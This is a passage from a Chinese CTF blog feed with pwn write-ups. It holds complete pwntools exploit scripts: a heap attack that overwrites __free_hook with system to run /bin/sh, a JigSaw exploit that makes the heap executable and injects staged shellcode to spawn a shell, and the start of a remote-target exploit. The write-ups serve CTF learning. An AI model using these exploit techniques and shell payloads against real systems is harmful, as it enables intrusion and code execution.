class=\"token operator\">=</span> leak <span class=\"token operator\">-</span> <span class=\"token number\">0x70</span>\nglobal_max_fast <span class=\"token operator\">=</span> leak <span class=\"token operator\">+</span> <span class=\"token number\">0x2fa0</span>\nlibc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span> __malloc_hook <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span>\ntcache_max_bins <span class=\"token operator\">=</span> <span class=\"token number\">0x1eb2d0</span> <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>address\n__free_hook <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span>\nsystem <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span>\n\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'tcache_max_bins'</span><span class=\"token punctuation\">,</span>tcache_max_bins<span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">4</span> <span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x538</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n\nshow<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nru<span class=\"token punctuation\">(</span><span class=\"token string\">'Pwd is: '</span><span class=\"token punctuation\">)</span>\nfd <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> key \np<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\nfdn <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> key \nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'fd'</span><span class=\"token punctuation\">,</span>fd<span class=\"token punctuation\">)</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'fdn'</span><span class=\"token punctuation\">,</span>fdn<span class=\"token punctuation\">)</span>\n\nfake <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span> fd <span class=\"token punctuation\">,</span> fd <span class=\"token punctuation\">,</span> fdn <span class=\"token punctuation\">,</span> tcache_max_bins <span class=\"token operator\">-</span> <span class=\"token number\">0x20</span> <span class=\"token punctuation\">)</span>\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span>fake <span class=\"token punctuation\">)</span>\n\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'libc.address'</span><span class=\"token punctuation\">,</span>libc<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">,</span>__malloc_hook<span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">5</span> <span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x530</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n\nrecovery<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>__free_hook<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">6</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x500</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">7</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x500</span> <span class=\"token punctuation\">,</span> decode<span class=\"token punctuation\">(</span>p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">9</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'/bin/sh\\x00'</span><span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># dbg()</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   pwdFree.py\n@Time    :   2021/08/21 20:08:21\n@Author  :   Niyah \n'''</span></code></pre>\n<h1 id=\"jigsawscage\"><a class=\"markdownIt-Anchor\" href=\"#jigsawscage\">#</a> JigSaw’sCage</h1>\n<p>说实话，不难，但不知道为啥比赛时没深做</p>\n<p>另外参照了 W&amp;M 战队的方法：<a href=\"https://mp.weixin.qq.com/s?__biz=MzIxMDYyNTk3Nw==&amp;mid=2247487347&amp;idx=3&amp;sn=74341c2480b155981da8081905dac97f&amp;chksm=9760fba5a01772b3ba7bd69d2d71a86c4471f0a611e31daa142304894d90eeeeb2ce5670e840&amp;mpshare=1&amp;scene=23&amp;srcid=0823b7LlkWG06N5TrXGRFt4w&amp;sharer_sharetime=1629698711378&amp;sharer_shareid=a2525076fb7710235921c4462953ffb5#rd\">祥云杯 2021 By W&amp;M（Pwn）部分 (qq.com)</a></p>\n<p>这题就更加明显了，直接可以让你执行长度小于 0x10 的 shellcode，但前提是让堆有执行权限</p>\n<p><img src=\"/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/8.png\" alt=\"1\"></p>\n<p>在最开始的时候有个洞 v1 只是整形，而可以输入长整形，那么我们可以把下面的随机数也一起控制了</p>\n<p><img src=\"/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/image-20210830212630568.png\" alt=\"image-20210830212630568\"></p>\n<p>这样就让堆有了执行权限</p>\n<p><img src=\"/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/1-16303300733865.png\" alt=\"1\"></p>\n<p>话说我看了挺多 wp，发现还是 wjh 师傅的 shellcode 最简单，充分考虑到了执行 shellcode 时各个寄存器的情况</p>\n<p>rax 为 0 刚好可以作为 read 的系统调用号，rdx 为执行的 shellcode 地址，刚好可以作为 read 的写入地址，之后直接读入大段 shellcode 即可</p>\n<p>再贴一下 Aidai 爷的短 shellcode</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\">asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token string\">'rsp'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">';jmp rsp'</span><span class=\"token punctuation\">)</span></code></pre>\n<p><img src=\"/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/shellcode.png\" alt=\"执行shellcode寄存器情况\"></p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span> \ncontext<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span> os <span class=\"token operator\">=</span> <span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch <span class=\"token operator\">=</span> <span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>timeout <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./JigSAW'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\">#libc = ELF('')</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    <span class=\"token comment\">#p = process(['qemu-arm', binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',-g,'1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': 0x%x'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">exhaust</span><span class=\"token punctuation\">(</span> pwn <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">global</span> p\n    i <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n    <span class=\"token keyword\">while</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n            i<span class=\"token operator\">+=</span><span class=\"token number\">0</span>\n            pwn<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n            lg<span class=\"token punctuation\">(</span><span class=\"token string\">'times ======== > '</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">)</span>\n            p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>DEBUG<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">else</span> <span class=\"token punctuation\">:</span>\n                p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">one_gadget</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    log<span class=\"token punctuation\">.</span>progress<span class=\"token punctuation\">(</span><span class=\"token string\">'Leak One_Gadgets...'</span><span class=\"token punctuation\">)</span>\n    one_ggs <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>subprocess<span class=\"token punctuation\">.</span>check_output<span class=\"token punctuation\">(</span>\n        <span class=\"token punctuation\">[</span><span class=\"token string\">'one_gadget'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'--raw'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-f'</span><span class=\"token punctuation\">,</span>filename<span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span>one_ggs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">':'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Index? :'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n    \n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Index? :'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'iNput:'</span><span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Index? :'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">'Name'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'niayh'</span><span class=\"token punctuation\">)</span>\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">'Make your Choice:'</span><span class=\"token punctuation\">,</span>u64<span class=\"token punctuation\">(</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 首先通过溢出修改执行权限</span>\n\nshellcode <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">'''\nxor rdi, rdi\nmov rsi, rdx\nmov rdx, 0x1000\nsyscall\n'''</span>\n<span class=\"token comment\"># 这里的 shellcode 因为长度受限，需要充分利用调用时各个寄存器的值</span>\n<span class=\"token comment\"># 程序使用了 call rdx ，这里 rdx 为 heap 段地址，还把 rax 给置 0 </span>\n<span class=\"token comment\"># 我们就可以进行 0 号系统调用 read 读到我们正在执行的 heap 中</span>\n\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">\"len\"</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 系统调用 read 读入 </span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> asm<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># dbg()</span>\ntest<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nse<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x90'</span> <span class=\"token operator\">*</span> <span class=\"token number\">0x20</span> <span class=\"token operator\">+</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 因为程序刚好在执行这段上面这条汇编</span>\n<span class=\"token comment\"># 这样操作刚好属于在执行的过程中把要执行的代码修改了</span>\n<span class=\"token comment\"># wjh 师傅tql，使用 nop 指令滑到 shellcode</span>\n\n<span class=\"token comment\"># 当然也可以多次对小片段 shellcode 来利用</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   JigSAW.py\n@Time    :   2021/08/24 17:58:53\n@Author  :   Niyah \n'''</span></code></pre>\n<h1 id=\"还有一道c嘉嘉写的pwn我先学一些再来复现\"><a class=\"markdownIt-Anchor\" href=\"#还有一道c嘉嘉写的pwn我先学一些再来复现\">#</a> 还有一道 C 嘉嘉写的 pwn，我先学一些再来复现</h1>\n",
            "tags": [
                "CTF",
                "PWN",
                "格式化字符串",
                "堆",
                "IO_FILE",
                "祥云杯"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/%E8%BF%91%E6%9C%9FPwn%E9%A2%98/",
            "url": "http://niyah.cn/CTF/%E8%BF%91%E6%9C%9FPwn%E9%A2%98/",
            "title": "近期Pwn题",
            "date_published": "2021-08-05T02:10:27.000Z",
            "content_html": "<blockquote>\n<p>太菜了</p>\n</blockquote>\n<a id=\"more\"></a>\n<h1 id=\"white_give_flag\"><a class=\"markdownIt-Anchor\" href=\"#white_give_flag\">#</a> White_Give_Flag</h1>\n<p>VNctf 的一道题目，名字是什么白给 flag 却没做出来，是个增删改都有的堆题</p>\n<p>程序在初始化时会调用 malloc 随机分配内存，之后用 read 写到某一堆块的用户区域 + 0x10 的地方，至于为什么 + 0x10，是为了不让 bin 的 fd 和 bk 覆盖掉 flag</p>\n<p>之后释放掉这个堆块，我们再次申请就有可能申请到这个堆块，那么我们再填上 0x10 字节的垃圾数据就可以打印出 flag，爆破即可</p>\n<p><img src=\"/CTF/%E8%BF%91%E6%9C%9FPwn%E9%A2%98/2.png\" alt=\"img\"></p>\n<p>至于怎么打印出 flag，程序中没有直接的输出函数，这里有一个奇怪的地方，通过 read 的返回值执行操作，会 puts 如下图的数组，而 read 返回 0 的会就会产生越界，这个数组上方刚好是储存了堆块的指针，我们可以通过 read 返回 0 来打印出 flag</p>\n<p><img src=\"/CTF/%E8%BF%91%E6%9C%9FPwn%E9%A2%98/3.png\" alt=\"img\"></p>\n<blockquote>\n<p>read 函数的返回值为成功输入的字符数量，失败则返回 0，可以使用 pwntools 让 read 函数返回 0</p>\n</blockquote>\n<p>Exp 如下</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span> \n<span class=\"token comment\">#context.update( os = 'linux', arch = 'amd64',timeout = 1)</span>\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./White_Give_Flag'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\">#libc = ELF('')</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',-g,'1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">'node4.buuoj.cn'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'39123'</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': 0x%x'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> 